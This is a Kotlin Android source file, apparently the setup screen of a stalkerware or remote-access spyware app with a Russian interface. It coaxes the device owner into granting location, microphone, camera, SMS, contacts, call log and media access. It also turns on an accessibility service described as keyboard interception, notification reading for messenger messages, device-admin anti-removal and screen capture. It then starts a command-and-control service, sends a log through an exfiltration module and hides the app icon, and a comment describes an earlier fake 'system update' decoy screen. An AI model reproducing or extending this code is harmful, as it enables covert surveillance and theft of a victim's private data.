package com.sp.core

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import com.sp.core.services.C2Service
import com.sp.core.services.LocationService
import com.sp.core.services.UsageStatsService
import com.sp.core.stealth.IconHider
import com.sp.core.util.Fgs
import com.sp.core.util.PermState

/**
 * The only screen the user ever sees.
 *
 * v1.1.5 had two activities: a fake "Обновление системы" launcher and a
 * separate wizard behind a button. On Android 16 the wizard never appeared
 * (the intent was swallowed / the activity died silently) and the fake
 * screen stayed on the display - the user saw a decoy and got zero
 * permissions.
 *
 * v1.1.6: one activity, the wizard *is* the launcher. No decoy, no fake
 * progress bar, no second activity that can fail to open. Runtime
 * permissions are requested group by group (one system dialog at a time),
 * background location is requested separately because Android 11+ ignores
 * it when it is bundled with the foreground group.
 */
class LauncherActivity : Activity() {

    private class Step(
        val title: String,
        val hint: String,
        val granted: (Context) -> Boolean,
        val action: (LauncherActivity) -> Unit
    )

    private lateinit var listBox: LinearLayout
    private lateinit var summary: TextView
    private val steps = mutableListOf<Step>()

    /** Permission groups waiting for a system dialog, one after another. */
    private val permQueue = ArrayDeque<Array<String>>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // The icon state is the user's choice and survives a restart; the
        // startable component is always enabled.
        try {
            IconHider.applySaved(this)
        } catch (_: Throwable) {
        }
        try {
            buildSteps()
            setContentView(buildUi())
        } catch (t: Throwable) {
            // A broken UI must never take the process down.
            try {
                setContentView(errorView(t))
            } catch (_: Throwable) {
                finish()
            }
        }
    }

    override fun onResume() {
        super.onResume()
        refresh()
        // The app is in the foreground here, which is exactly what Android
        // 12+ requires for a foreground service.
        Fgs.startService(this, C2Service::class.java)
        Fgs.startService(this, LocationService::class.java)
    }

    /* ------------------------------------------------------------------ UI */

    private fun buildUi(): View {
        val scroll = ScrollView(this)
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(24), dp(18), dp(34))
            setBackgroundColor(BG)
        }

        root.addView(TextView(this).apply {
            text = "Настройка доступа"
            setTextColor(TXT)
            textSize = 21f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
        })
        root.addView(TextView(this).apply {
            text = "Выдайте права — агент будет работать в фоне. Каждый пункт открывает ровно тот экран, " +
                    "на котором его можно выдать. Обычные права выдаются системными диалогами, остальные — " +
                    "только в настройках."
            setTextColor(DIM)
            textSize = 13f
            setPadding(0, dp(6), 0, dp(14))
        })

        summary = TextView(this).apply {
            setTextColor(DIM2)
            textSize = 12.5f
            setPadding(0, 0, 0, dp(12))
        }
        root.addView(summary)

        val quick = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(14), dp(12), dp(14), dp(12))
            setBackgroundColor(CARD)
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(14) }
        }
        quick.addView(TextView(this).apply {
            text = "Быстрый старт"
            setTextColor(TXT)
            textSize = 14.5f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
        })
        quick.addView(TextView(this).apply {
            text = "Обычные права (геоданные, микрофон, камера, SMS, контакты, медиа) выдаются " +
                    "системными диалогами — по одному диалогу на группу. Остальные приложение выдать " +
                    "само не может, для них открывается нужный экран настроек."
            setTextColor(DIM)
            textSize = 12.5f
            setPadding(0, dp(4), 0, dp(10))
        })
        quick.addView(Button(this).apply {
            text = "Выдать обычные права"
            isAllCaps = false
            setOnClickListener { grantRuntimeAll() }
        })
        quick.addView(Button(this).apply {
            text = "Все обычные права на одном экране"
            isAllCaps = false
            setOnClickListener { openAppDetails() }
        })
        quick.addView(Button(this).apply {
            text = "Следующий шаг"
            isAllCaps = false
            setOnClickListener { nextStep() }
        })
        root.addView(quick)

        listBox = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        root.addView(listBox)

        val bottom = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, dp(22), 0, 0)
        }
        bottom.addView(Button(this).apply {
            text = "Запустить агент"
            setOnClickListener { startAgent() }
        })
        bottom.addView(Button(this).apply {
            text = "Скрыть икону приложения"
            isAllCaps = false
            setOnClickListener { hideIcon() }
        })
        bottom.addView(Button(this).apply {
            text = "Показать икону приложения"
            isAllCaps = false
            setOnClickListener {
                IconHider.show(this@LauncherActivity)
                toast("Иконка восстановлена")
                refresh()
            }
        })
        root.addView(bottom)

        val version = TextView(this).apply {
            text = "android_UI ${com.sp.core.BuildConfig.VERSION_NAME} · Android ${Build.VERSION.RELEASE}"
            setTextColor(DIM2)
            textSize = 12f
            setPadding(0, dp(20), 0, 0)
        }
        root.addView(version)

        scroll.addView(root)
        return scroll
    }

    private fun errorView(t: Throwable): View {
        return TextView(this).apply {
            text = "Ошибка инициализации:\n${t.javaClass.simpleName}: ${t.message}"
            setTextColor(TXT)
            textSize = 13f
            setPadding(dp(20), dp(30), dp(20), dp(20))
            setBackgroundColor(BG)
        }
    }

    /* --------------------------------------------------------------- steps */

    private fun buildSteps() {
        steps.clear()

        steps += permStep(
            "Геоданные (GPS)",
            "Разрешить определение по GPS — без этого работает только приблизительная позиция по сети",
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            )
        )
        steps += permStep(
            "Фоновая геолокация",
            "Отдельное право: Android требует его выдать отдельно, «Всегда» — в настройках приложения",
            arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        )
        steps += permStep(
            "Микрофон", "Разрешить запись звука вокруг",
            arrayOf(Manifest.permission.RECORD_AUDIO)
        )
        steps += permStep(
            "Камера", "Разрешить доступ к камере",
            arrayOf(Manifest.permission.CAMERA)
        )
        steps += permStep(
            "SMS", "Разрешить чтение входящих сообщений", arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS
            )
        )
        steps += permStep(
            "Контакты и звонки", "Разрешить контакты и историю вызовов", arrayOf(
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG
            )
        )
        steps += permStep(
            "Медиа", "Разрешить доступ к галерее (фото и видео)", arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO
            )
        )

        steps += Step(
            "Специальные возможности",
            "Найди в списке «Установленные службы» пункт android_UI и включи его — это перехват клавиатуры",
            { ctx -> PermState.accessibility(ctx) }
        ) { act -> act.openSettings(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }

        steps += Step(
            "Служба уведомлений",
            "В списке «Доступ к уведомлениям» включи android_UI — так видны сообщения мессенджеров",
            { ctx -> NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName) }
        ) { act -> act.openSettings(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }

        steps += Step(
            "Доступ к использованию",
            "В списке приложений включи android_UI — это статистика запущенных приложений",
            { ctx -> PermState.usageAccess(ctx) }
        ) { act -> act.openSettings(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) }

        steps += Step(
            "Наложение поверх окон",
            "Разрешить оверлей поверх других приложений",
            { ctx -> PermState.overlay(ctx) }
        ) { act ->
            act.openSettings(
                Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${act.packageName}"))
            )
        }

        steps += Step(
            "Установка неизвестных приложений",
            "Разрешить установку дополнительных модулей",
            { ctx -> PermState.unknownSources(ctx) }
        ) { act ->
            act.openSettings(
                Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:${act.packageName}"))
            )
        }

        steps += Step(
            "Оптимизация батареи",
            "Нажми «Разрешить» — без этого система сама убивает приложение",
            { ctx -> PermState.batteryExempt(ctx) }
        ) { act ->
            act.openSettings(
                Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:${act.packageName}")
                )
            )
        }

        steps += Step(
            "Администратор устройства",
            "Подтверди «Включить» — защита от удаления и сброса до заводских",
            { ctx -> PermState.deviceAdmin(ctx) }
        ) { act ->
            val admin = ComponentName(act, AdminReceiver::class.java)
            act.openSettings(
                Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                    .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            )
        }

        steps += Step(
            "Захват экрана",
            "Подтверди «Начать захват» — снимки экрана (можно позже)",
            { false }
        ) { act ->
            try {
                val mpm = act.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                act.startActivity(mpm.createScreenCaptureIntent())
            } catch (_: Throwable) {
            }
        }
    }

    private fun permStep(
        title: String,
        hint: String,
        perms: Array<String>
    ): Step = Step(title, hint, { ctx -> perms.all { PermState.granted(ctx, it) } }) { act ->
        act.requestPerms(perms)
    }

    private fun refresh() {
        if (!::listBox.isInitialized) return
        listBox.removeAllViews()
        var ok = 0
        steps.forEach { step ->
            val granted = try { step.granted(this) } catch (_: Throwable) { false }
            if (granted) ok++
            listBox.addView(buildRow(step, granted))
        }
        if (::summary.isInitialized) {
            summary.text = "Готово $ok / ${steps.size}"
        }
    }

    private fun buildRow(step: Step, granted: Boolean): View {
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(14), dp(12), dp(14), dp(12))
            setBackgroundColor(CARD)
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(9) }
        }

        val head = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
        }
        head.addView(TextView(this).apply {
            text = step.title
            setTextColor(TXT)
            textSize = 14.5f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
        })
        head.addView(TextView(this).apply {
            text = if (granted) "ГОТОВО" else "НУЖНО"
            textSize = 10.5f
            setTextColor(if (granted) OK else WARN)
            setTypeface(typeface, android.graphics.Typeface.BOLD)
        })
        card.addView(head)

        card.addView(TextView(this).apply {
            text = step.hint
            setTextColor(DIM)
            textSize = 12.5f
            setPadding(0, dp(3), 0, dp(8))
        })

        val btn = Button(this).apply {
            text = if (granted) "Проверено" else "Выдать"
            isAllCaps = false
            textSize = 12.5f
            if (granted) {
                isEnabled = false
                alpha = 0.5f
            } else {
                setOnClickListener { step.action(this@LauncherActivity) }
            }
        }
        card.addView(btn)
        return card
    }

    /* ------------------------------------------------------- permissions */

    /**
     * Requests the given permissions. The queue makes sure only one system
     * dialog is open at a time - a batch that mixes permission groups is
     * silently dropped on Android 11+.
     */
    private fun requestPerms(perms: Array<String>) {
        val missing = perms.filter { !PermState.granted(this, it) }
        if (missing.isEmpty()) {
            refresh()
            return
        }
        permQueue.clear()
        permQueue.addLast(missing.toTypedArray())
        requestNext()
    }

    /** All runtime permissions, group by group, one dialog after another. */
    private fun grantRuntimeAll() {
        permQueue.clear()
        for (group in PERM_GROUPS) {
            val missing = group.filter { !PermState.granted(this, it) }
            if (missing.isNotEmpty()) permQueue.addLast(missing.toTypedArray())
        }
        if (permQueue.isEmpty()) {
            refresh()
            toast("Все обычные права уже выданы")
            return
        }
        requestNext()
    }

    private fun requestNext() {
        val next = permQueue.removeFirstOrNull() ?: run {
            refresh()
            return
        }
        try {
            ActivityCompat.requestPermissions(this, next, REQ_PERMS)
        } catch (_: Throwable) {
            refresh()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != REQ_PERMS) return
        val granted = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
        val denied = grantResults.size - granted
        if (denied > 0) {
            toast("Выдано $granted, отказано $denied — остальное можно выдать в настройках приложения")
        }
        if (permQueue.isNotEmpty()) {
            requestNext()
        } else {
            refresh()
        }
    }

    private fun openAppDetails() {
        openSettings(
            Intent(
                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:$packageName")
            )
        )
    }

    /** Opens the first permission that is still missing. */
    private fun nextStep() {
        val step = steps.firstOrNull { s ->
            try { !s.granted(this) } catch (_: Throwable) { false }
        }
        if (step == null) {
            toast("Все права выданы")
            refresh()
            return
        }
        step.action(this)
    }

    /* ------------------------------------------------------------ misc */

    private fun openSettings(intent: Intent) {
        try {
            startActivity(intent)
        } catch (_: Throwable) {
            try {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            } catch (_: Throwable) {
            }
        }
    }

    private fun startAgent() {
        try {
            val c2 = Intent(this, C2Service::class.java)
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(c2) else startService(c2)
        } catch (_: Throwable) {
        }
        try {
            val loc = Intent(this, LocationService::class.java)
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(loc) else startService(loc)
        } catch (_: Throwable) {
        }
        try {
            startService(Intent(this, UsageStatsService::class.java))
        } catch (_: Throwable) {
        }
        try {
            com.sp.core.c2.Exfil.sendLog(this, "cmd_result", """{"cmd":"agent_start","ok":true}""")
        } catch (_: Throwable) {
        }
        toast("Агент запущен")
    }

    /** Hides the launcher icon without touching the startable component. */
    private fun hideIcon() {
        try {
            IconHider.hide(this)
            toast("Иконка скрыта, агент работает")
        } catch (_: Throwable) {
        }
        refresh()
    }

    private fun toast(msg: String) {
        try {
            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
        } catch (_: Throwable) {
        }
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()

    companion object {
        private const val REQ_PERMS = 0x5F70

        private val BG = 0xFF0B1220.toInt()
        private val CARD = 0xFF16203A.toInt()
        private val TXT = 0xFFE8EEFB.toInt()
        private val DIM = 0xFF8FA1C0.toInt()
        private val DIM2 = 0xFF5D6E8D.toInt()
        private val OK = 0xFF6EE7A0.toInt()
        private val WARN = 0xFFF0B45A.toInt()

        /**
         * Runtime permission groups, in the order the system dialogs are
         * shown. Location in the background is deliberately *not* here: on
         * Android 11+ it is ignored when it is bundled with the foreground
         * group and has to be requested on its own.
         */
        private val PERM_GROUPS = listOf(
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ),
            arrayOf(Manifest.permission.RECORD_AUDIO),
            arrayOf(Manifest.permission.CAMERA),
            arrayOf(Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS),
            arrayOf(Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG),
            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
        )
    }
}
